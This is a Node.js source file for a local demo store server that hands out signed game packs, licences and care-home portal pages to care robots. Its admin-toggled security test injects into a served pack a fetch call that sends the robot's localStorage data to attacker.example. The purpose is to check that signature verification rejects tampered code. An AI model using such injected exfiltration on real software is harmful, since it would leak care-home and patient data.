// LabLand store server, for the demo on this PC:  node labland/store-server.mjs [port]
//
// It plays LabLand's side of the Bellatrix Library:
//   /store/catalog.json, /store/packages/...   the signed catalog and game packs (labland/store)
//   /store/api/...                             what a care home's robot asks: its licence, a free trial,
//                                              an activation request
//   /labland/admin.html  + /store/admin/...    LabLand's admin page: care homes, packs, requests
// and it serves the Care Team and patient pages themselves, like start.bat did.
//
// Only this computer can open it (127.0.0.1), so the admin page has no login in this demo. The data
// (care homes, licences, requests) is kept in labland/data/store-data.json. Licences are signed with
// LabLand's private key here, on the server: the key never goes to a robot or a browser.
// Plain Node (no packages).
import http from 'node:http';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import { HERE, APP, build, hasKey, signText, verifyText, sha256 } from './store-tool.mjs';
import { callApi } from './call-relay.mjs';
import { linkApi, MAX_BODY as LINK_MAX } from './display-link.mjs';
import { portalApi } from './family-portal.mjs';
import { atelierApi } from './atelier.mjs';
import { gamesApi } from './games.mjs';
import { mealsApi } from './meals.mjs';
/* 15 Nov: the robot head's clock runs on China time (UTC+8), so "tomorrow" and the kitchen's order deadline
   were wrong (the menu showed "closed" at 13:00 in Germany). The server always works in the clinic's time zone. */
if (!process.env.TZ) process.env.TZ = process.env.BELLATRIX_TZ || 'Europe/Berlin';
/* The head's own clock was also 8 hours ahead (it showed 20:47 at 12:47 UTC). The server reads the real time once
   from an HTTPS "Date" header and keeps the difference; the meal module uses it ("tomorrow", the order deadline). */
globalThis.__bellatrixClockOffset = 0;
if (process.env.BELLATRIX_DATA && !process.env.BELLATRIX_NO_CLOCK) {
  const syncClock = async () => {
    try {
      const r = await fetch('https://www.cloudflare.com/cdn-cgi/trace', { method: 'GET', signal: AbortSignal.timeout(8000) });
      const real = Date.parse(r.headers.get('date') || '');
      if (!real) return;
      const off = real - Date.now();
      globalThis.__bellatrixClockOffset = Math.abs(off) > 120000 ? off : 0;
      globalThis.__bellatrixClockSynced = true; globalThis.__bellatrixClockError = '';
      if (globalThis.__bellatrixClockOffset) console.log('clock: this device is ' + Math.round(off / 60000) + ' min off; the server uses the real time');
    } catch (e) { globalThis.__bellatrixClockError = String((e && (e.cause && e.cause.code || e.message)) || e).slice(0, 120); /* offline: the device clock is used */ }
  };
  syncClock(); setInterval(syncClock, 6 * 3600 * 1000).unref();
}
/* The other family-portal modules (activity feed, notifications, call requests), when present: they
   register their routes under /portal/api/ with registerRoutes (labland/family-portal.mjs). */
for (const m of ['family-feed.mjs', 'family-notify.mjs', 'family-callreq.mjs']) {
  if (fs.existsSync(path.join(HERE, m))) {
    try { await import('./' + m); } catch (e) { console.error('Could not load labland/' + m + ': ' + (e && e.message || e)); }
  }
}

const PORT = Number(process.argv.slice(2).find((a) => /^\d+$/.test(a)) || process.env.PORT || 8767);
/* --lan: the robot on the same Wi-Fi may reach the calls (Start robot test server.bat). The LabLand
   admin pages still answer only to this PC. */
const LAN = process.argv.includes('--lan');
function ownAddresses() {
  const out = ['127.0.0.1', '::1'];
  for (const list of Object.values(os.networkInterfaces())) for (const a of list || []) out.push(a.address);
  return out;
}
/* A request through an HTTPS tunnel (cloudflared, Start phone test.bat) also arrives from 127.0.0.1,
   but comes from the internet: it carries proxy headers and is never "this PC" (no admin page, no
   redirect of the family page to localhost). */
function viaTunnel(req) { const h = req.headers || {}; return !!(h['cf-connecting-ip'] || h['cf-ray'] || h['x-forwarded-for'] || h['forwarded']); }
function fromThisPc(req) { if (viaTunnel(req)) return false; const a = String(req.socket.remoteAddress || '').replace(/^::ffff:/, ''); return ownAddresses().includes(a); }
function lanAddresses() {
  const out = [];
  for (const list of Object.values(os.networkInterfaces())) for (const a of list || []) if (a.family === 'IPv4' && !a.internal) out.push(a.address);
  return out;
}
/* BELLATRIX_DATA: the one folder this server writes to. On the robot head (android HeadServer) the pages and
   modules are a read-only copy and the data lives in the app's own folder; on this PC: labland/data. */
const DATA_DIR = process.env.BELLATRIX_DATA ? path.resolve(process.env.BELLATRIX_DATA) : path.join(HERE, 'data');
if (process.env.BELLATRIX_DATA && !process.env.PORTAL_DATA) process.env.PORTAL_DATA = path.join(DATA_DIR, 'portal');
const DATA = path.join(DATA_DIR, 'store-data.json');
const STORE = path.join(HERE, 'store');
const DAY = 24 * 60 * 60 * 1000;
/* The robot head never has LabLand's key: it serves the signed catalog it carries and signs no licence. */
const HEAD = !!process.env.BELLATRIX_DATA && !hasKey();

if (!HEAD && (!hasKey() || !fs.existsSync(path.join(STORE, 'catalog.json')))) build();

/* ---------- the catalog and packs LabLand publishes ---------- */
function catalog() {
  const raw = JSON.parse(fs.readFileSync(path.join(STORE, 'catalog.json'), 'utf8'));
  return { raw, data: JSON.parse(raw.catalog), ok: verifyText(raw.catalog, raw.signature) };
}
function packOf(id) { return catalog().data.packs.find((p) => p.id === id) || null; }
function packageCheck(p) {
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(STORE, p.package.file), 'utf8'));
    return { id: p.id, file: p.package.file, version: p.package.version, bytes: p.package.bytes,
      signed: verifyText(pkg.manifest + '\n' + pkg.code, pkg.signature), hashOk: sha256(pkg.code) === p.package.sha256 };
  } catch (e) {
    return { id: p.id, file: p.package.file, signed: false, hashOk: false, error: String(e.message || e) };
  }
}

/* ---------- care homes, licences and requests ---------- */
function iso(t) { return new Date(t).toISOString(); }
function seed() {
  const now = Date.now();
  const year = { status: 'active', since: iso(now), until: iso(now + 365 * DAY) };
  return {
    careHomes: {
      'DEMO-2026': { name: 'Demo care home', created: iso(now), packs: { memory: Object.assign({}, year), movement: Object.assign({}, year), music: Object.assign({}, year) }, trialsUsed: {} }
    },
    requests: [],
    security: { tamper: false },
    log: [{ at: iso(now), text: 'Store started with the demo care home DEMO-2026 (Memory, Movement and Music active for a year).' }]
  };
}
function load() {
  try { return JSON.parse(fs.readFileSync(DATA, 'utf8')); } catch (e) { const d = seed(); save(d); return d; }
}
function save(d) {
  fs.mkdirSync(path.dirname(DATA), { recursive: true });
  fs.writeFileSync(DATA, JSON.stringify(d, null, 2));
}
function note(d, text) {
  d.log.unshift({ at: iso(Date.now()), text });
  d.log = d.log.slice(0, 60);
  console.log(new Date().toLocaleTimeString('en-GB') + '  ' + text);
}
function licenceFor(code) {
  const d = load(), home = d.careHomes[code];
  if (!home) return null;
  const packs = {};
  for (const p of catalog().data.packs) {
    if (p.included) { packs[p.id] = { status: 'included' }; continue; }
    const s = home.packs[p.id];
    if (s && s.status !== 'off') packs[p.id] = { status: s.status, until: s.until };
  }
  const text = JSON.stringify({ format: 'bellatrix-licence/1', careHome: { code, name: home.name }, issued: iso(Date.now()), packs });
  return { licence: text, signature: signText(text) };
}
function setPack(d, code, packId, status, days) {
  const home = d.careHomes[code], now = Date.now();
  if (status === 'off') home.packs[packId] = { status: 'off', since: iso(now) };
  else home.packs[packId] = { status, since: iso(now), until: iso(now + days * DAY) };
}
function newCode(d, name) {
  const letters = (name.toUpperCase().replace(/[^A-Z]/g, '') + 'HOME').slice(0, 4);
  let code;
  do { code = letters + '-' + String(1000 + Math.floor(Math.random() * 9000)); } while (d.careHomes[code]);
  return code;
}

/* ---------- what a robot asks ---------- */
function api(req, url, body) {
  if (HEAD) return [503, { error: 'no-store-here', message: 'Licences come from LabLand, not from the robot.' }];
  const d = load();
  if (url.pathname === '/store/api/licence') {
    const lic = licenceFor(String(url.searchParams.get('code') || '').trim().toUpperCase());
    return lic ? [200, lic] : [404, { error: 'unknown-code', message: 'This care home code is not known to the Bellatrix Library.' }];
  }
  if (url.pathname === '/store/api/requests') {
    const code = String(url.searchParams.get('code') || '').toUpperCase();
    return [200, { requests: d.requests.filter((r) => r.code === code) }];
  }
  if (url.pathname === '/store/api/request' && req.method === 'POST') {
    const code = String(body.code || '').toUpperCase(), home = d.careHomes[code], pack = packOf(body.pack);
    if (!home) return [404, { error: 'unknown-code', message: 'This care home code is not known to the Bellatrix Library.' }];
    if (!pack || pack.included) return [400, { error: 'bad-pack', message: 'This pack cannot be requested.' }];
    const cur = home.packs[pack.id], live = cur && cur.status !== 'off' && Date.parse(cur.until) > Date.now();
    if (body.kind === 'trial') {
      if (live) return [200, Object.assign({ ok: true, already: true }, licenceFor(code))];
      if (home.trialsUsed[pack.id]) return [409, { error: 'trial-used', message: 'The free trial of ' + pack.name + ' was already used in this care home. Ask LabLand to activate it.' }];
      const days = catalog().data.trialDays || 30;
      setPack(d, code, pack.id, 'trial', days);
      home.trialsUsed[pack.id] = iso(Date.now());
      note(d, home.name + ' (' + code + ') started a ' + days + '-day free trial of ' + pack.name + '.');
      save(d);
      return [200, Object.assign({ ok: true }, licenceFor(code))];
    }
    if (body.kind === 'activate') {
      let r = d.requests.find((x) => x.code === code && x.pack === pack.id && x.state === 'pending');
      if (!r) {
        r = { id: 'Q' + Date.now().toString(36), code, pack: pack.id, at: iso(Date.now()), state: 'pending' };
        d.requests.unshift(r);
        note(d, home.name + ' (' + code + ') asks LabLand to activate ' + pack.name + '.');
        save(d);
      }
      return [200, { ok: true, pending: true, request: r }];
    }
    return [400, { error: 'bad-kind' }];
  }
  return null;
}

/* ---------- LabLand's admin page ---------- */
function admin(req, url, body) {
  const d = load();
  if (url.pathname === '/store/admin/state') {
    const c = catalog();
    return [200, { careHomes: d.careHomes, requests: d.requests, security: d.security, log: d.log, catalog: c.data, catalogSigned: c.ok,
      packages: c.data.packs.filter((p) => p.package).map(packageCheck), port: PORT }];
  }
  if (req.method !== 'POST') return [405, { error: 'POST only' }];
  if (url.pathname === '/store/admin/care-home') {
    const name = String(body.name || '').trim().slice(0, 80);
    if (!name) return [400, { error: 'A name is needed.' }];
    const code = newCode(d, name);
    d.careHomes[code] = { name, created: iso(Date.now()), packs: {}, trialsUsed: {} };
    note(d, 'LabLand added the care home ' + name + ' (' + code + ').');
    save(d);
    return [200, { ok: true, code }];
  }
  if (url.pathname === '/store/admin/pack') {
    const home = d.careHomes[body.code], pack = packOf(body.pack);
    if (!home || !pack || pack.included) return [400, { error: 'Unknown care home or pack.' }];
    if (body.action === 'activate') setPack(d, body.code, pack.id, 'active', 365);
    else if (body.action === 'trial') setPack(d, body.code, pack.id, 'trial', catalog().data.trialDays || 30);
    else if (body.action === 'off') setPack(d, body.code, pack.id, 'off');
    else return [400, { error: 'Unknown action.' }];
    note(d, 'LabLand set ' + pack.name + ' for ' + home.name + ': ' + (body.action === 'activate' ? 'active for 12 months' : body.action === 'trial' ? 'free trial' : 'turned off') + '.');
    save(d);
    return [200, { ok: true }];
  }
  if (url.pathname === '/store/admin/request') {
    const r = d.requests.find((x) => x.id === body.id);
    if (!r || r.state !== 'pending') return [400, { error: 'No such open request.' }];
    const home = d.careHomes[r.code], pack = packOf(r.pack);
    r.state = body.decision === 'approve' ? 'approved' : 'declined';
    r.decided = iso(Date.now());
    if (r.state === 'approved') setPack(d, r.code, r.pack, 'active', 365);
    note(d, 'LabLand ' + r.state + ' ' + (pack ? pack.name : r.pack) + ' for ' + (home ? home.name : r.code) + (r.state === 'approved' ? ' (12 months).' : '.'));
    save(d);
    return [200, { ok: true }];
  }
  if (url.pathname === '/store/admin/reset') {
    const fresh = seed();
    note(fresh, 'Demo started again from the beginning.');
    save(fresh);
    return [200, { ok: true }];
  }
  if (url.pathname === '/store/admin/security') {
    d.security.tamper = !!body.tamper;
    note(d, d.security.tamper ? 'SECURITY TEST ON: the store now serves a modified Board games pack (not signed by LabLand).' : 'Security test off: the store serves the signed pack again.');
    save(d);
    return [200, { ok: true }];
  }
  return [404, { error: 'not found' }];
}

/* ---------- files ---------- */
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.mjs': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8', '.svg': 'image/svg+xml', '.png': 'image/png', '.jpg': 'image/jpeg', '.woff2': 'font/woff2', '.ttf': 'font/ttf', '.woff': 'font/woff',
  '.webmanifest': 'application/manifest+json; charset=utf-8', '.wasm': 'application/wasm', '.task': 'application/octet-stream', '.tflite': 'application/octet-stream', '.mp3': 'audio/mpeg', '.ogg': 'audio/ogg', '.wav': 'audio/wav', '.ico': 'image/x-icon' };
/* Only what the pages need: never the keys, the store data, the robot tools or the Android build. */
function fileFor(p) {
  if (p === '/' ) p = '/index.html';
  let base = APP, rel = p;
  if (p.startsWith('/store/')) { base = STORE; rel = p.slice('/store'.length); }
  else if (/^\/labland\/admin\.(html|js|css)$/.test(p)) { base = HERE; rel = p.slice('/labland'.length); }
  /* PC test mode (?allgames, localhost only) loads the packs from their sources, as start.bat does, so
     the family call demo can offer Ludo. Robots only ever run packs signed by LabLand (js/store.js
     checks every signature), so serving the sources here changes nothing for them. */
  else if (/^\/labland\/packs\/[a-z0-9-]+\/[a-z0-9-]+\.(js|json)$/.test(p)) { base = path.join(HERE, 'packs'); rel = p.slice('/labland/packs'.length); }
  else if (!(/^\/[a-z]+\.html$/.test(p) || /^\/(js|css|vendor|transfer|img|icons|fonts)\//.test(p) || p === '/portail.webmanifest' || p === '/sw-portail.js')) return null;
  const full = path.normalize(path.join(base, decodeURIComponent(rel)));
  return full.startsWith(base + path.sep) ? full : null;
}
function sendFile(res, full, tamper) {
  fs.readFile(full, (err, buf) => {
    if (err) { res.writeHead(404, { 'Content-Type': 'text/plain' }); res.end('Not found'); return; }
    if (tamper) {
      /* The security test: the same pack with one line changed, as an attacker would, but without
         LabLand's key it cannot be signed again. The robot must refuse it. */
      const pkg = JSON.parse(buf.toString('utf8'));
      pkg.code = pkg.code.replace('Lab.define({', 'fetch("http://attacker.example/steal?data=" + encodeURIComponent(localStorage.getItem("bellatrix-care-lab-v1")));\n  Lab.define({');
      buf = Buffer.from(JSON.stringify(pkg));
    }
    const head = { 'Content-Type': TYPES[path.extname(full).toLowerCase()] || 'application/octet-stream', 'Cache-Control': 'no-store', 'Access-Control-Allow-Origin': '*' };
    /* 24 Nov (Rahma: more security for the family app): its page cannot be shown inside another site's frame
       (no click-jacking), sends no address to other sites, and its files are never read as another type. */
    if (/^portail/.test(path.basename(full))) Object.assign(head, { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'", 'Referrer-Policy': 'no-referrer', 'X-Content-Type-Options': 'nosniff' });
    res.writeHead(200, head);
    res.end(buf);
  });
}
function json(res, status, obj) {
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store', 'Access-Control-Allow-Origin': '*' });
  res.end(JSON.stringify(obj));
}
function headInfo() {
  let t = '';
  try { t = String(JSON.parse(fs.readFileSync(path.join(DATA_DIR, 'head-info.json'), 'utf8')).tunnel || ''); } catch (e) { t = ''; }
  return { node: 'running', tunnel: /^https:\/\/[A-Za-z0-9.-]{1,200}$/.test(t) ? t : null,
    clock: { offsetMin: Math.round((globalThis.__bellatrixClockOffset || 0) / 60000), synced: !!globalThis.__bellatrixClockSynced, error: globalThis.__bellatrixClockError || '' } };
}

function videoFile(req, res, url) {
  const dir = process.env.BELLATRIX_VIDEOS || path.join(DATA_DIR, 'videos');
  let name = '';
  try { name = decodeURIComponent(url.pathname.slice('/videos/'.length)); } catch (e) { name = ''; }
  const local = !req.headers['cf-connecting-ip'] && !req.headers['cf-ray'] && /^(::ffff:)?127\.0\.0\.1$|^::1$/.test(req.socket.remoteAddress || '');
  if (!local || !/^[A-Za-z0-9._-]{1,80}\.mp4$/.test(name)) { res.writeHead(404, { 'Content-Type': 'text/plain' }); res.end('Not found'); return; }
  const full = path.join(dir, name);
  fs.stat(full, (err, st) => {
    if (err || !st.isFile()) { res.writeHead(404, { 'Content-Type': 'text/plain' }); res.end('Not found'); return; }
    const total = st.size;
    let start = 0, end = total - 1, partial = false;
    const m = /^bytes=(\d*)-(\d*)$/.exec(String(req.headers.range || '').trim());
    if (m && (m[1] || m[2])) {
      partial = true;
      if (m[1]) { start = Number(m[1]); if (m[2]) end = Math.min(total - 1, Number(m[2])); }
      else { start = Math.max(0, total - Number(m[2])); }
    }
    if (start > end || start >= total) { res.writeHead(416, { 'Content-Range': 'bytes */' + total }); res.end(); return; }
    const h = { 'Content-Type': 'video/mp4', 'Accept-Ranges': 'bytes', 'Content-Length': String(end - start + 1), 'Cache-Control': 'no-store', 'Access-Control-Allow-Origin': '*' };
    if (partial) h['Content-Range'] = 'bytes ' + start + '-' + end + '/' + total;
    res.writeHead(partial ? 206 : 200, h);
    if (req.method === 'HEAD') { res.end(); return; }
    fs.createReadStream(full, { start, end }).on('error', () => res.destroy()).pipe(res);
  });
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://localhost');
  /* Care V1 family portal and messages (labland/family-portal.mjs): it reads its own bodies (photos). */
  if (url.pathname.startsWith('/portal/api/')) { portalApi(req, res, url); return; }
  /* "Ajouter un jeu" (labland/games.mjs): the care team's own games, /games/... and the import page /jeu. */
  if (url.pathname.startsWith('/games/') || url.pathname === '/jeu' || url.pathname === '/jeu/') { gamesApi(req, res, url); return; }
  /* "Menu" (labland/meals.mjs): tomorrow's meals chosen on the tablet, the kitchen page /cuisine, /meals/... */
  if (url.pathname.startsWith('/meals/') || url.pathname === '/cuisine' || url.pathname === '/cuisine/') { mealsApi(req, res, url); return; }
  /* 16 Nov: the demo films for Demo mode on this head (Android/data/<app>/files/videos), with byte ranges for the
     player. Only for the head itself: never through the public tunnel (cloudflared adds cf-* headers). */
  if (url.pathname.startsWith('/videos/')) { videoFile(req, res, url); return; }
  if (req.method === 'OPTIONS') {
    res.writeHead(204, { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET, POST, OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' });
    res.end();
    return;
  }
  const isApi = url.pathname.startsWith('/store/api/'), isAdmin = url.pathname.startsWith('/store/admin/');
  if ((isAdmin || /^\/labland\/admin\./.test(url.pathname)) && !fromThisPc(req)) { json(res, 403, { error: 'The LabLand admin page opens only on the PC that runs the server.' }); return; }
  /* The PC opening the family link with its own Wi-Fi address: back to localhost, the only plain-http
     address where the browser allows the camera and microphone (the #link code is kept). */
  if (url.pathname === '/famille.html' && LAN && fromThisPc(req) && !/^(localhost|127\.0\.0\.1)(:|$)/.test(String(req.headers.host || ''))) {
    res.writeHead(302, { Location: 'http://localhost:' + PORT + req.url });
    res.end();
    return;
  }
  /* Family video calls (labland/call-relay.mjs): signalling only, some answers wait (long-polling). */
  const isCall = url.pathname.startsWith('/call/api/');
  /* Head screen <-> patient tablet of one robot (labland/display-link.mjs): memory only, long-polling. */
  const isLink = url.pathname.startsWith('/link/api/');
  /* Bellatrix Atelier (labland/atelier.mjs): the optional AI generator, off without ANTHROPIC_API_KEY. */
  const isAtelier = url.pathname.startsWith('/atelier/api/');
  if (isApi || isAdmin || isCall || isLink || isAtelier) {
    let raw = '', tooBig = false;
    const limit = isLink ? LINK_MAX : 65536;
    req.on('data', (c) => {
      if (tooBig) return;
      raw += c;
      if (raw.length > limit) { if (isLink) { tooBig = true; raw = ''; } else req.destroy(); }
    });
    req.on('end', () => {
      if (tooBig) { json(res, 413, { error: 'too-large' }); return; }
      let body = {};
      try { body = raw ? JSON.parse(raw) : {}; } catch (e) { json(res, 400, { error: 'bad JSON' }); return; }
      if (isLink) {
        Promise.resolve().then(() => linkApi(req, url, body, res))
          .then((out) => { if (out && !res.headersSent && !res.destroyed) json(res, out[0], out[1]); })
          .catch((e) => { console.error(e); if (!res.headersSent) json(res, 500, { error: 'server error' }); });
        return;
      }
      if (isAtelier) {
        Promise.resolve().then(() => atelierApi(req, url, body))
          .then((out) => { if (!res.headersSent) json(res, out[0], out[1]); })
          .catch((e) => { console.error(e); if (!res.headersSent) json(res, 500, { error: 'server error' }); });
        return;
      }
      if (isCall) {
        Promise.resolve().then(() => callApi(req, url, body, res))
          .then((out) => { if (out && !res.headersSent && !res.destroyed) json(res, out[0], out[1]); })
          .catch((e) => { console.error(e); if (!res.headersSent) json(res, 500, { error: String(e.message || e) }); });
        return;
      }
      try {
        const out = isApi ? api(req, url, body) : admin(req, url, body);
        if (!out) json(res, 404, { error: 'not found' }); else json(res, out[0], out[1]);
      } catch (e) {
        console.error(e);
        json(res, 500, { error: String(e.message || e) });
      }
    });
    return;
  }
  /* The robot head's public https address (the Android app writes head-info.json), for its tablet. */
  if (url.pathname === '/head/api/info' && req.method === 'GET') { json(res, 200, headInfo()); return; }
  const full = fileFor(url.pathname);
  if (!full) { res.writeHead(404, { 'Content-Type': 'text/plain' }); res.end('Not found'); return; }
  const tamper = url.pathname.startsWith('/store/packages/') && load().security.tamper;
  sendFile(res, full, tamper);
});
server.on('error', (e) => {
  if (e.code === 'EADDRINUSE') console.error('Port ' + PORT + ' is already in use: close the other Bellatrix server window (start.bat) and start again.');
  else console.error(e);
  process.exitCode = 1;
  if (process.env.BELLATRIX_DATA) process.exit(1);   // the robot head's app starts it again
});
server.listen(PORT, LAN ? '0.0.0.0' : '127.0.0.1', () => {
  load();
  /* First start on a robot head: the portal folder and the Web Push key pair are made now, not at the first push. */
  if (process.env.BELLATRIX_DATA) {
    try { fs.mkdirSync(process.env.PORTAL_DATA, { recursive: true }); } catch (e) { console.error(e); }
    import('./family-notify.mjs').then((m) => { if (m.shared) m.shared().publicKey(); }).catch((e) => console.error('Web Push keys: ' + (e && e.message || e)));
  }
  console.log('Bellatrix Library (LabLand demo) on this PC:');
  console.log('  Care Team:     http://localhost:' + PORT + '/staff.html');
  console.log('  LabLand admin: http://localhost:' + PORT + '/labland/admin.html');
  console.log('  Family portal: http://localhost:' + PORT + '/portail.html');
  if (LAN) {
    console.log('');
    console.log('Robot test mode: robots on this Wi-Fi can reach the calls.');
    for (const ip of lanAddresses()) console.log('  On the robot, Care Team > Family > Call server:  http://' + ip + ':' + PORT);
  }
  console.log('Close this window to stop it.');
});
